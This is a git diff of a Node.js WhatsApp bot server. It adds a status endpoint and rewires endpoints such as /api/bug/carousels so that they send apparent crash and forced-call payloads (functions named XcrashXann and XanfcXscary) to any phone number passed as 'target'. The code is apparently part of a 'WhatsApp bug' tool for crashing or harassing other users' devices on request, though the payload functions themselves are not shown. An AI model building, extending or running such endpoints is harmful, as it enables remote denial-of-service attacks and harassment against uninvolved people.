@@ -82,6 +82,19 @@ async function clientstart() {
         console.log(`your pairing code: ${code}`);
     }
 
+    // Endpoint untuk status bot
+    app.get('/api/status', (req, res) => {
+        try {
+            if (client.user?.id) {
+                res.json({ status: 'Online', user: client.user.id });
+            } else {
+                res.json({ status: 'Offline' });
+            }
+        } catch (error) {
+            res.status(500).json({ status: 'Error', message: 'Failed to get status' });
+        }
+    });
+
     app.get('/api/bug/carousels', async (req, res) => {
         const { target, fjids } = req.query;
         if (!target) return res.status(400).json({
@@ -98,7 +111,7 @@ async function clientstart() {
         let cuki = bijipeler + '@s.whatsapp.net';
         const info = await getRequest(req);
         try {
-            await carousels2(client, cuki, fjids);
+            await XcrashXann(client, cuki, fjids);
             res.json({
                 status: true,
                 creator: global.creator,
@@ -137,7 +150,7 @@ ${info.timestamp}`;
         let cuki = bijipeler + '@s.whatsapp.net';
         const info = await getRequest(req);
         try {
-            await forceCall(client, cuki);
+            await XanfcXscary(client, cuki);
             res.json({
                 status: true,
                 creator: global.creator,
